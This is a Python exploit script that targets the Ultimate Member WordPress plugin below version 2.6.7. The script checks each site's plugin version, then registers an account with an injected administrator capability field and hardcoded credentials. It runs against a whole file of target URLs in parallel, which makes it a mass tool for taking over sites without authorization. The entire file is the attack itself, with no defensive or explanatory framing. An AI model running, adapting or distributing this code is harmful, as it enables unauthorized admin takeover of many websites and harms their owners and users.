import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style
from concurrent import futures

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

username = "secragon"
password = "OffensiveSecurity123"
email = "exploit@secragon.com"

def check_version(target):
    try:
        r = requests.get(f"http://{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except:
        return None

    return version

def add_admin(target, form_id):
    headers = {
        'User-Agent': 'Secragon Offensive Agent'
    }

    s = requests.Session()
    try:
        r = s.get(f'http://{target}/index.php/register/', headers=headers, verify=False)
        nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
    except:
        return False

    data = {
        f'user_login-{form_id}': username,
        f'user_email-{form_id}': email,
        f'user_password-{form_id}': password,
        f'confirm_user_password-{form_id}': password,
        f'first_name-{form_id}': 'Exploit',
        f'last_name-{form_id}': 'bySecragon',
        'form_id': form_id,
        'um_request': '',
        '_wpnonce': nonce,
        'wp_c√†pabilities[administrator]': 1
    }

    r = s.post(f'http://{target}/index.php/register/', data=data, headers=headers, verify=False)
    if r.history[0].status_code == 302:
        return True

    return False

def exploit(target):
    version = check_version(target)
    if version is None:
        print(f"{Fore.RED}[ERROR] Failed to get version for {target}")
        return

    if int(version.replace('.', '')) < 267:
        print(f"{Fore.GREEN}[*] {target} - Vulnerable! Exploiting...")
        success = add_admin(target, 6)
        if success:
            print(f"{Fore.GREEN}[SUCCESS] Exploited {target} - Admin created!")
        else:
            print(f"{Fore.RED}[ERROR] Failed to exploit {target}")
    else:
        print(f"{Fore.YELLOW}[*] {target} - Not vulnerable!{Fore.WHITE}")

print()
print(Fore.BLUE + "\t\t --- Ultimate Member exploit ---")
print("\t\t   (unauthorized admin access)")
print(Fore.RED + "\t\tby gbrsh@secragon - modified to mass by youez")
print(Style.RESET_ALL)

parser = argparse.ArgumentParser()
parser.add_argument('filename', help='File containing target URLs, one per line')

if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

args = parser.parse_args()
filename = args.filename

with open(filename, 'r') as file:
    targets = file.read().splitlines()

with futures.ThreadPoolExecutor() as executor:
    results = executor.map(exploit, targets)

print()
